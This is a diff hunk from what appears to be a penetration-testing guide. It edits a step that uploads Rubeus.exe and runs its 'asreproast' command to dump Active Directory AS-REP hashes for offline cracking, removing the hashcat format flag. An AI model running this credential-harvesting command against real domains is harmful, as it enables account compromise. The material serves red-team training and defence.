@@ -97,7 +97,7 @@ upload </PATH/TO/THE/FILE/Rubeus.exe> .
 After successfully upload the Rubeus.exe file, run the following command to perform AS-REP Roasting:
 
 ```powershell
-.\Rubeus.exe asreproast /nowrap /outfile:hashes.txt /format:hashcat
+.\Rubeus.exe asreproast /nowrap /outfile:hashes.txt
 ```
 
 <figure><img src="../../../../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>
